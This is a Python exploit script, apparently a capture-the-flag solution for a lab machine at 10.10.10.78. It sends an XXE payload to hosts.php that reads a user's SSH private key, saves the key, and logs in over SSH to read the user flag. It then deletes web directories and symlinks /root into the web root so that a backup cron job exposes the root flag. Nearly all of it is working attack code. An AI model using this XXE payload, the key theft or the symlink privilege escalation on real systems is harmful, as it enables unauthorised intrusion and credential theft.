import requests,os,paramiko
from pwn import *

server = "10.10.10.78"
url = "http://10.10.10.78/hosts.php"

xxe = """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE details [<!ELEMENT subnet_mask ANY ><!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa" >]><details><subnet_mask>&xxe;</subnet_mask><test></test></details>"""

log.info("Exploit Started")
log.info("Get florian ssh id_rsa through XXE") 
r = requests.post(url, data=xxe)
res = r.text

key = res[42:] 

print key

log.info("Write to disk id_rsa and set proper permissions")
f = open("/tmp/id_rsa", 'w')
f.write(key)
f.close()

os.system("chmod 600 /tmp/id_rsa")

log.info("Connect ssh as florian user")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(server, username='florian', key_filename='/tmp/id_rsa')
stdin, stdout, stderr = ssh.exec_command("cat user.txt")
log.info("Reading User flag")
log.success("USER: %s" %str(stdout.read()))

log.info("Tricks backup cronscript with symlink")
stdin, stdout, stderr = ssh.exec_command("rm -rf /var/www/html/dev_wiki && rm /var/www/html/zz_backup && ln -s /root /var/www/html/zz_backup && mkdir /var/www/html/dev_wiki && sleep 300 && cat /var/www/html/dev_wiki/root.txt")
log.info("Reading Root flag")
log.success("ROOT: %s" %str(stdout.read()))

